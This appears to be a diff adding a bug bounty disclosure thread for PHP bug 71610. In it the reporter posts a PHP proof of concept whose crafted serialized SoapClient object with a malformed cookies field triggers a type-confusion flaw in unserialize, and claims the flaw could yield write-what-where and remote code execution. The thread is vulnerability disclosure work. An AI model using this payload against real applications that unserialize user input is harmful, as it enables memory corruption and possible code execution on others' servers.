@@ -1,0 +1,24 @@
+
+l4w submitted a report to PHP (IBB).	Feb 16th (4 years ago)
+https://bugs.php.net/bug.php?id=71610
+
+arice posted a comment.	May 1st (3 years ago)
+Hi @l4w! Sorry for the delay on handling. Could you please provide us with a brief assessment of potential remote impact on these?
+
+l4w posted a comment.	May 1st (3 years ago)
+<?php
+
+$exploit = unserialize('O:10:"SoapClient":3:{s:3:"uri";s:1:"a";s:8:"location";s:17:"http://localhost/%22;s:8:%22_cookies%22;a:1:%7Bs:8:%22manhluat%22;a:3:%7Bi:0;s:0:%22%22;i:1;N;i:2;N;%7D%7D%7D%7D');
+$exploit->blahblah();
+
+?>
+
+The above script can show us.
+
+If the source code receive user's input as unserialize data, and then call some method who doesn't exists with that class will cause a type-confusion bug.
+
+With the type of this bug, attackers probably control the ZVAL structure, overwrite zval pointer and can write-what-where for example, and results in remote code execution.
+
+https://www.owasp.org/index.php/Write-what-where_condition
+
+Thank you && Regards.
